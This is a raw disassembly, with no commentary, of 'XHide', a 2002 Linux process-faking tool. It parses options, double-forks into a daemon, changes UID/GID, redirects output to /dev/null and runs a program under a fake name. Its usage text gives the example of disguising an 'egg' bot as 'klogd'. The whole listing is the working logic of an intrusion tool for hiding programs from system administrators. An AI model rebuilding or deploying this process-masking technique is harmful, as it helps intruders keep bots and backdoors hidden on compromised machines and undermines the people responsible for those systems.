xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push dbg.__libc_csu_fini
push dbg.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
call 0x804890d
pop ebx
add ebx, 0x1d33
push edx
mov eax, dword [ebx + 0x88]
test eax, eax
je 0x8048921
call eax
pop eax
pop ebx
leave
ret
push ebp
mov ebp, esp
push eax
push eax
cmp byte [obj.completed.1], 0
jne 0x804896c
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
je 0x8048965
lea esi, [esi]
add eax, 4
mov dword [obj.p.0], eax
call edx
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
jne 0x8048950
mov byte [obj.completed.1], 1
leave
ret
push ebp
mov ebp, esp
push ecx
push ecx
mov edx, dword [obj.__JCR_LIST__]
test edx, edx
je 0x8048998
mov eax, 0
test eax, eax
je 0x8048998
sub esp, 0xc
push obj.__JCR_LIST__
call loc.imp.__gmon_start__
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
mov ebx, obj.__CTOR_LIST__
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x8049310
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8049304
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 4
push dword [arg_8h]
push str.XHide___Process_Faker__by_Schizoprenic_Xnuxer_Research__c__2002_n_nOptions:_n_s_string_tFake_name_process_n_d_t_tRun_aplication_as_daemon_system__optional__n_u_uid_:gid__tChange_UID_GID__use_another_user__optional__n_p_filename_tSave_PID_to_filename__optional__n_nExample:__s__s__klogd__m_0___d__p_test.pid_._egg_bot.conf_n_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
jmp dword [reloc.fprintf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
sub esp, 0x88
mov eax, dword [s2]
cmp byte [eax], 0x2f
jne 0x8048b55
mov eax, dword [s2]
mov dword [var_7ch], eax
jmp 0x8048c9e
sub esp, 0xc
push 0x100
call sym.imp.malloc
add esp, 0x10
mov dword [ptr], eax
mov eax, dword [s2]
cmp byte [eax], 0x2e
jne 0x8048bc2
sub esp, 8
push 0xff
push dword [ptr]
call sym.imp.getcwd
add esp, 0x10
test eax, eax
je 0x8048bb6
sub esp, 8
push 0x804938a
push dword [ptr]
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push dword [s2]
push dword [ptr]
call sym.imp.strcat
add esp, 0x10
mov eax, dword [ptr]
mov dword [var_7ch], eax
jmp 0x8048c9e
mov dword [var_7ch], 0
jmp 0x8048c9e
sub esp, 0xc
push str.PATH
call sym.imp.getenv
add esp, 0x10
mov dword [s], eax
mov eax, dword [s]
mov dword [var_ch], eax
cmp dword [s], 0
jne 0x8048be6
jmp 0x8048c89
sub esp, 8
push 0x3a
push dword [s]
call sym.imp.strchr
add esp, 0x10
mov dword [s], eax
cmp dword [s], 0
je 0x8048c05
mov eax, dword [s]
mov byte [eax], 0
sub esp, 0xc
push dword [s2]
push dword [var_ch]
push str._s__s
push 0x100
push dword [ptr]
call sym.imp.snprintf
add esp, 0x20
sub esp, 8
lea eax, [var_78h]
push eax
push dword [ptr]
call dbg.__stat
add esp, 0x10
cmp eax, 0xffffffff
je 0x8048c71
mov eax, dword [var_68h]
and eax, 0xf000
cmp eax, 0x8000
jne 0x8048c71
mov eax, dword [var_68h]
and eax, 0x40
test eax, eax
jne 0x8048c69
mov eax, dword [var_68h]
and eax, 8
test eax, eax
jne 0x8048c69
mov eax, dword [var_68h]
and eax, 1
test eax, eax
jne 0x8048c69
jmp 0x8048c71
mov eax, dword [ptr]
mov dword [var_7ch], eax
jmp 0x8048c9e
cmp dword [s], 0
jne 0x8048c79
jmp 0x8048c89
lea eax, [s]
inc dword [eax]
mov eax, dword [s]
mov dword [var_ch], eax
jmp 0x8048bdb
sub esp, 0xc
push dword [ptr]
call sym.imp.free
add esp, 0x10
mov dword [var_7ch], 0
mov eax, dword [var_7ch]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x14
mov eax, dword [arg_ch]
call sym.__i686.get_pc_thunk.bx
add ebx, 0x1381
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], 3
mov dword [var_4h], eax
call sym.imp.__xstat
add esp, 0x14
pop ebx
pop ebp
ret
mov ebx, dword [esp]
ret
jmp dword [reloc.__xstat]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
call sym.__i686.get_pc_thunk.bx
add ebx, 0x13f2
mov dword [var_4h], edi
lea eax, [ebx - 0xec]
lea edi, [ebx - 0xec]
mov dword [var_8h], esi
sub eax, edi
sar eax, 2
test eax, eax
lea esi, [eax - 1]
jne 0x8049284
call sym._fini
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
call dword [edi + esi*4]
mov eax, esi
dec esi
test eax, eax
jne 0x8049284
call sym._fini
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
call 0x804931d
pop ebx
add ebx, 0x1323
push eax
call sym.__do_global_dtors_aux
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
push ebp
mov ebp, esp
sub esp, 0x128
sub esp, 4
push 0x100
push 0
lea eax, [dest]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
push 0x100
push dword [src]
lea eax, [dest]
push eax
call sym.imp.strncpy
add esp, 0x10
lea eax, [dest]
mov dword [str], eax
mov eax, dword [str]
cmp byte [eax], 0
jne 0x80489f1
jmp 0x8048a19
mov eax, dword [str]
cmp byte [eax], 0x3a
jne 0x8048a0f
mov eax, dword [str]
mov byte [eax], 0
lea eax, [str]
inc dword [eax]
jmp 0x8048a19
lea eax, [str]
inc dword [eax]
jmp 0x80489e4
sub esp, 0xc
lea eax, [dest]
push eax
call sym.imp.getpwnam
add esp, 0x10
mov dword [var_110h], eax
cmp dword [var_110h], 0
je 0x8048a5a
mov eax, dword [var_110h]
mov eax, dword [eax + 8]
mov dword [var_118h], eax
mov eax, dword [var_110h]
mov eax, dword [eax + 0xc]
mov dword [var_11ch], eax
jmp 0x8048a72
sub esp, 0xc
lea eax, [dest]
push eax
call sym.imp.atoi
add esp, 0x10
mov dword [var_118h], eax
mov eax, dword [str]
cmp byte [eax], 0
je 0x8048ac5
sub esp, 0xc
push dword [str]
call sym.imp.getgrnam
add esp, 0x10
mov dword [var_114h], eax
cmp dword [var_114h], 0
je 0x8048aae
mov eax, dword [var_114h]
mov eax, dword [eax + 8]
mov dword [var_11ch], eax
jmp 0x8048ac5
sub esp, 0xc
push dword [str]
call sym.imp.atoi
add esp, 0x10
mov dword [var_11ch], eax
sub esp, 0xc
push dword [var_11ch]
call sym.imp.setgid
add esp, 0x10
test eax, eax
je 0x8048af6
sub esp, 0xc
push str.Error:_Cant_set_GID
call sym.imp.perror
add esp, 0x10
mov dword [var_120h], 0
jmp 0x8048b31
sub esp, 0xc
push dword [var_118h]
call sym.imp.setuid
add esp, 0x10
test eax, eax
je 0x8048b27
sub esp, 0xc
push str.Error:_Cant_set_UID
call sym.imp.perror
add esp, 0x10
mov dword [var_120h], 0
jmp 0x8048b31
mov dword [var_120h], 1
mov eax, dword [var_120h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
xor esi, esi
call sym.__i686.get_pc_thunk.bx
add ebx, 0x144d
mov dword [var_4h], edi
call sym._init
lea edx, [ebx - 0xec]
lea eax, [ebx - 0xec]
sub edx, eax
sar edx, 2
cmp esi, edx
jae 0x804922b
mov dword [var_10h], eax
mov edi, edx
nop
lea esi, [esi]
call dword [eax + esi*4]
inc esi
mov eax, dword [var_10h]
cmp esi, edi
jb 0x8049220
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x164
and esp, 0xfffffff0
mov eax, 0
sub esp, eax
mov dword [var_134h], 0
mov eax, dword [envp]
mov eax, dword [eax]
mov dword [var_11ch], eax
cmp dword [argv], 1
jg 0x8048d0c
sub esp, 0xc
push dword [var_11ch]
call sym.usage
add esp, 0x10
mov dword [var_140h], 1
mov eax, dword [var_140h]
cmp eax, dword [argv]
jl 0x8048d26
jmp 0x8048e34
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
mov eax, dword [eax + edx]
cmp byte [eax], 0x2d
jne 0x8048e34
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
mov eax, dword [eax + edx]
inc eax
mov al, byte [eax]
mov byte [var_9h], al
movsx eax, al
mov dword [var_154h], eax
cmp dword [var_154h], 0x70
je 0x8048de7
cmp dword [var_154h], 0x70
jg 0x8048d88
cmp dword [var_154h], 0x64
je 0x8048e0a
jmp 0x8048e16
cmp dword [var_154h], 0x73
je 0x8048d9c
cmp dword [var_154h], 0x75
je 0x8048dbf
jmp 0x8048e16
lea eax, [var_140h]
inc dword [eax]
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
mov eax, dword [eax + edx]
mov dword [src], eax
jmp 0x8048e27
sub esp, 0xc
lea eax, [var_140h]
inc dword [eax]
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
push dword [eax + edx]
call sym.changeown
add esp, 0x10
jmp 0x8048e27
lea eax, [var_140h]
inc dword [eax]
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
mov eax, dword [eax + edx]
mov dword [filename], eax
jmp 0x8048e27
mov dword [var_134h], 1
jmp 0x8048e27
sub esp, 0xc
push dword [var_11ch]
call sym.usage
add esp, 0x10
lea eax, [var_140h]
inc dword [eax]
jmp 0x8048d16
mov edx, dword [var_140h]
mov eax, dword [argv]
sub eax, edx
mov dword [size], eax
mov eax, dword [size]
test eax, eax
je 0x8048e58
cmp dword [src], 0
jne 0x8048e69
sub esp, 0xc
push dword [var_11ch]
call sym.usage
add esp, 0x10
sub esp, 0xc
mov eax, dword [size]
shl eax, 2
inc eax
push eax
call sym.imp.malloc
add esp, 0x10
mov dword [var_14ch], eax
mov dword [var_13ch], 0
mov eax, dword [var_13ch]
cmp eax, dword [size]
jl 0x8048e9f
jmp 0x8048eda
mov eax, dword [var_13ch]
lea ecx, [eax*4]
mov ebx, dword [var_14ch]
mov eax, dword [var_140h]
lea edx, [eax*4]
mov eax, dword [envp]
mov eax, dword [eax + edx]
mov dword [ebx + ecx], eax
lea eax, [var_140h]
inc dword [eax]
lea eax, [var_13ch]
inc dword [eax]
jmp 0x8048e8f
mov eax, dword [var_13ch]
lea edx, [eax*4]
mov eax, dword [var_14ch]
mov dword [eax + edx], 0
sub esp, 0xc
mov eax, dword [var_14ch]
push dword [eax]
call sym.fullpath
add esp, 0x10
mov dword [var_128h], eax
cmp dword [var_128h], 0
jne 0x8048f30
sub esp, 0xc
push str.Full_path_seek
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov eax, dword [var_128h]
mov dword [var_12ch], eax
cmp dword [size], 1
jle 0x8048f9c
sub esp, 4
push 0xff
push 0x20
lea eax, [dest]
push eax
call sym.imp.memset
add esp, 0x10
mov byte [var_19h], 0
sub esp, 4
sub esp, 8
push dword [src]
call sym.imp.strlen
add esp, 0xc
push eax
push dword [src]
lea eax, [dest]
push eax
call sym.imp.strncpy
add esp, 0x10
mov edx, dword [var_14ch]
lea eax, [dest]
mov dword [edx], eax
jmp 0x8048faa
mov edx, dword [var_14ch]
mov eax, dword [src]
mov dword [edx], eax
cmp dword [var_134h], 0
je 0x804910b
sub esp, 8
push 2
push str._dev_null
call sym.imp.open
add esp, 0x10
mov dword [var_138h], eax
cmp dword [var_138h], 0xffffffff
jne 0x8048ff7
sub esp, 0xc
push str.Error:__dev_null
call sym.imp.perror
add esp, 0x10
mov dword [var_150h], 0xffffffff
jmp 0x80491d2
call sym.imp.fork
mov dword [var_15ch], eax
cmp dword [var_15ch], 0xffffffff
je 0x8049019
cmp dword [var_15ch], 0
je 0x8049038
jmp 0x80490fc
sub esp, 0xc
push str.Error:_FORK_1
call sym.imp.perror
add esp, 0x10
mov dword [var_150h], 0xffffffff
jmp 0x80491d2
call sym.imp.setsid
call sym.imp.fork
mov dword [var_158h], eax
cmp dword [var_158h], 0xffffffff
je 0x804905f
cmp dword [var_158h], 0
je 0x804907e
jmp 0x80490ed
sub esp, 0xc
push str.Error:_FORK_2
call sym.imp.perror
add esp, 0x10
mov dword [var_150h], 0xffffffff
jmp 0x80491d2
sub esp, 0xc
push 0
call sym.imp.umask
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push 2
call sym.imp.close
add esp, 0x10
sub esp, 8
push 0
push dword [var_138h]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 1
push dword [var_138h]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 2
push dword [var_138h]
call sym.imp.dup2
add esp, 0x10
jmp 0x804910b
mov dword [var_150h], 0
jmp 0x80491d2
mov dword [var_150h], 0
jmp 0x80491d2
sub esp, 4
push 0
push 0
push 0xffffffffffffffff
call sym.imp.waitpid
add esp, 0x10
call sym.imp.getpid
mov dword [var_148h], eax
cmp dword [filename], 0
je 0x8049182
sub esp, 8
push 0x804951d
push dword [filename]
call sym.imp.fopen
add esp, 0x10
mov dword [stream], eax
cmp dword [stream], 0
je 0x8049182
sub esp, 4
push dword [var_148h]
push 0x804951f
push dword [stream]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push dword [stream]
call sym.imp.fclose
add esp, 0x10
push dword [var_148h]
push dword [src]
push str.__Fakename:__s_PidNum:__d_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push dword [var_14ch]
push dword [var_12ch]
call sym.imp.execv
add esp, 0x10
sub esp, 0xc
push str.Couldnt_execute
call sym.imp.perror
add esp, 0x10
mov dword [var_150h], 0xffffffff
mov eax, dword [var_150h]
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.getgrnam]
jmp dword [reloc.strchr]
jmp dword [reloc.getpid]
jmp dword [reloc.close]
jmp dword [reloc.perror]
jmp dword [reloc.fork]
jmp dword [reloc.getenv]
jmp dword [reloc.umask]
jmp dword [reloc.setgid]
jmp dword [reloc.malloc]
jmp dword [reloc.setsid]
jmp dword [reloc.execv]
jmp dword [reloc.waitpid]
jmp dword [reloc.strlen]
jmp dword [reloc.dup2]
jmp dword [reloc.strcat]
jmp dword [reloc.fclose]
jmp dword [reloc.snprintf]
jmp dword [reloc.open]
jmp dword [reloc.getpwnam]
jmp dword [reloc.atoi]
jmp dword [reloc.free]
jmp dword [reloc.getcwd]
jmp dword [reloc.memset]
jmp dword [reloc.strncpy]
jmp dword [reloc.fopen]
jmp dword [reloc.setuid]
